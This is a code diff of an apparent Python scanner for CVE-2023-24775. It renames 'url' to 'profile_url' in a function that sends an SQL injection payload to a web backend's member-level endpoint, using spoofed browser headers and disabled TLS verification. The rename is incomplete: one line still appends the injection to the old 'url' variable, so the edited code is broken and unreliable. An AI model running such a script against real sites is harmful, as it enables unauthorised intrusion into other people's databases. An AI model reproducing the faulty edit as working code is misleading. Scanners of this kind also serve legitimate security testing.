@@ -12,7 +12,7 @@ def generate_csrf_token():
     csrf_token = uuid.uuid4()
     return str(csrf_token).replace('-', '')
 
-def common_headers(url):
+def common_headers(profile_url):
     csrf_token = generate_csrf_token()
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
@@ -20,16 +20,16 @@ def common_headers(url):
         "Accept-Language": "zh-CN,zh",
         "X-Requested-With": "XMLHttpRequest",
         "X-CSRF-TOKEN": csrf_token,
-        "Host": url,
+        "Host": profile_url,
         "Content-Type": "application/x-www-form-urlencoded",
         "charset": "UTF-8",
         "Accept-Encoding": "gzip"
     }
     return headers
 
-def scan_cve_2023_24775(url):
-    headers = common_headers(url)
-    url = f"{url}/backend/member.memberLevel/index?parentField=pid&"
+def scan_cve_2023_24775(profile_url):
+    headers = common_headers(profile_url)
+    profile_url = f"{profile_url}/backend/member.memberLevel/index?parentField=pid&"
 
     cookies = {
         'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
@@ -44,9 +44,9 @@ def scan_cve_2023_24775(url):
         sqli = urllib.parse.quote_plus(sqli)
 
     url += f"selectFields%5Bname%5D=name&selectFields%5Bvalue%5D={sqli}"
-    print(f"Request URL: {url}")
+    print(f"Request URL: {profile_url}")
 
-    sqli_request = requests.get(url, cookies=cookies, headers=headers, verify=False)
+    sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
     print(sqli_request.text)
 
     if 'message' in sqli_request.text:
